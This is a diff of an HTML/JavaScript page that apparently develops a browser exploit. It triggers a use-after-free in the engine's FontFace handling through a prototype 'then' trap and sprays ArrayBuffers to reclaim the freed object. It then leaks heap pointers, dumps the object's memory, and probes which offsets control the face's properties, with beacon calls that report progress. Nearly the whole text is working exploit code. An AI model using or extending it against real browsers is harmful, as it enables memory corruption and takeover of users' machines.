@@ -168,17 +168,21 @@ function restoreBuffer(u8, L1, L2){
 b('BOOT-' + UID + ',ctl=0');
 
 var gSa, gPa, faces=[], sprayBufs=[], hitIdx=-1;
-var SPRAY_COUNT = 4096;
+var SPRAY_COUNT = 128;
 var L1=[0,0], L2=[0,0], SELF=[0,0], VTAB=[0,0];
 
+var gStyleEl;
 try {
-  gSa = new FontFace('sa', 'url(data:font/woff2;base64,d09GMk9UVE8AAAARAA)', {style:'normal'});
-  gPa = new FontFace('pa', 'url(data:font/woff2;base64,d09GMk9UVE8AAAARAA)', {style:'normal'});
+  gSa = new FontFace('sa', 'local(Helvetica)', {unicodeRange:'U+0041'});
   document.fonts.add(gSa);
-  document.fonts.add(gPa);
+  void gSa.loaded;
+  window._fontKeep = [gSa];
+  gStyleEl = document.createElement('style');
+  gStyleEl.textContent = "@font-face{font-family:pa;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(gStyleEl);
 } catch(e){ b('INIT-ERR-'+e.message); verd('bad','Init failed'); }
 
-/* Phase 0: trigger UAF via .then trap */
+/* Phase 0: trigger UAF via .then trap (matches p579-combined pattern) */
 var trapFired = false;
 Object.defineProperty(FontFace.prototype, 'then', {
   configurable: true,
@@ -187,8 +191,11 @@ Object.defineProperty(FontFace.prototype, 'then', {
     trapFired = true;
     b('TRAP-FIRE');
 
-    /* Remove sa from fonts → CSSFontFace freed */
-    document.fonts.delete(gSa);
+    /* p579 pattern: remove CSS @font-face, delete JS FontFace, force layout */
+    if(gStyleEl) gStyleEl.remove();
+    try{ document.fonts.delete(this); }catch(x){}
+    document.body.offsetHeight;
+    b('F');
 
     /* Spray 192B ArrayBuffers to reclaim the freed slot */
     for(var i=0; i<SPRAY_COUNT; i++){
@@ -205,43 +212,89 @@ Object.defineProperty(FontFace.prototype, 'then', {
     b('SPRAY-' + SPRAY_COUNT);
 
     return undefined;
-  }
+  },
+  set: function(){}
 });
 
-document.fonts.load('12px sa').then(function(loaded){
-  b('RES-n' + loaded.length);
-  if(loaded.length < 1){ b('NO-TRIGGER'); verd('bad','No trigger'); return; }
+document.fonts.load('1em sa, pa', 'AB').then(function(){},function(){});
 
-  faces = loaded;
-  var face = faces[0];
-
-  /* Read engine-written fields from spray buffers */
+/* Delayed scan: engine writes to reclaimed buffer during next layout cycle */
+var scanDone = 0;
+function scanSpray(){
+  if(scanDone) return;
   for(var i=0; i<sprayBufs.length; i++){
     var u8 = sprayBufs[i].u8;
-    var q58 = get64(u8, 0x58);
-    var q68 = get64(u8, 0x68);
-
-    /* L1 at +0x58: hash table pointer (heap region ~0x10xxxxxxxxxx) */
-    if(q58[0] > 0 && q58[0] < 0x20 && q58[1] !== 0 &&
-       q68[0] > 0 && q68[0] < 0x20 && q68[1] !== 0){
-      L1 = q58;
-      L2 = q68;
+    if(u8[0]){
+      scanDone = 1;
       hitIdx = i;
-      break;
+      L1 = get64(u8, 0x58);
+      L2 = get64(u8, 0x68);
+      b('H' + i + ',T=' + hexQ(L1[0], L1[1]) + ',W=' + hexQ(L2[0], L2[1]));
+      afterHit();
+      return;
     }
   }
+}
+setTimeout(scanSpray, 60);
+setTimeout(scanSpray, 400);
+setTimeout(scanSpray, 1000);
+setTimeout(function(){ if(!scanDone){ scanDone=1; b('NOLEAK'); verd('bad','No spray hit after 2s'); }}, 2000);
 
-  if(hitIdx < 0){
-    b('NOLEAK');
-    verd('bad','No spray hit');
-    return;
+function afterHit(){
+  var face = gSa;  /* the freed face — its JS wrapper still alive */
+
+  var hitBuf = sprayBufs[hitIdx];
+  var u8d = hitBuf.u8;
+
+  /* Full 192-byte dump: beacon every 8-byte qword to find code pointers */
+  for(var di=0; di<192; di+=8){
+    var qw = get64(u8d, di);
+    if(qw[0] !== 0 || qw[1] !== 0){
+      bs('D+' + di.toString(16) + '=' + hexQ(qw[0], qw[1]));
+    }
+  }
+  b('DUMP-DONE');
+
+  /* Probe: which FontFace getters read from the buffer vs JS cache? */
+  var props = ['style','weight','stretch','unicodeRange','display'];
+  var origVals = {};
+  for(var pi=0; pi<props.length; pi++){
+    try{ origVals[props[pi]] = String(face[props[pi]]); }catch(e){}
+  }
+  bs('ORIG=' + (origVals.style||'?') + '|' + (origVals.weight||'?') + '|' +
+     (origVals.stretch||'?') + '|' + (origVals.unicodeRange||'?') + '|' +
+     (origVals.display||'?'));
+
+  /* Write 0xCC pattern at each offset, check if any getter changes */
+  var changedOffs = [];
+  for(var ti=0; ti<192; ti+=8){
+    var sav = [u8d[ti],u8d[ti+1],u8d[ti+2],u8d[ti+3],
+               u8d[ti+4],u8d[ti+5],u8d[ti+6],u8d[ti+7]];
+    u8d[ti]=0xCC;u8d[ti+1]=0xCC;u8d[ti+2]=0xCC;u8d[ti+3]=0xCC;
+    u8d[ti+4]=0xCC;u8d[ti+5]=0xCC;u8d[ti+6]=0xCC;u8d[ti+7]=0xCC;
+    for(var qi=0; qi<props.length; qi++){
+      try{
+        var nv = String(face[props[qi]]);
+        if(nv !== origVals[props[qi]]){
+          changedOffs.push(ti.toString(16)+':'+props[qi]+'='+nv.slice(0,20));
+        }
+      }catch(e){
+        changedOffs.push(ti.toString(16)+':'+props[qi]+'=ERR');
+      }
+    }
+    u8d[ti]=sav[0];u8d[ti+1]=sav[1];u8d[ti+2]=sav[2];u8d[ti+3]=sav[3];
+    u8d[ti+4]=sav[4];u8d[ti+5]=sav[5];u8d[ti+6]=sav[6];u8d[ti+7]=sav[7];
+  }
+  if(changedOffs.length){
+    for(var ci=0; ci<changedOffs.length && ci<10; ci++){
+      b('CHG-'+changedOffs[ci]);
+    }
+  } else {
+    b('ALL-CACHED');
   }
 
   b('L1-' + hexQ(L1[0], L1[1]));
   b('L2-' + hexQ(L2[0], L2[1]));
-  b('FORGED-1');
-
-  var hitBuf = sprayBufs[hitIdx];
 
   /* Rename face for tracking */
   try{ face.family = 'zz0'; b('FAMILY-OK'); }catch(e){ b('FAMILY-ERR'); }
@@ -669,10 +722,6 @@ document.fonts.load('12px sa').then(function(loaded){
 
   /* Run the walk chain with a small delay to let layout settle after delete */
   setTimeout(doWalk, 200);
-
-}).catch(function(err){
-  b('LOAD-ERR-' + err);
-  verd('bad', 'fonts.load failed');
-});
+} /* end afterHit */
 </script>
 </body></html>
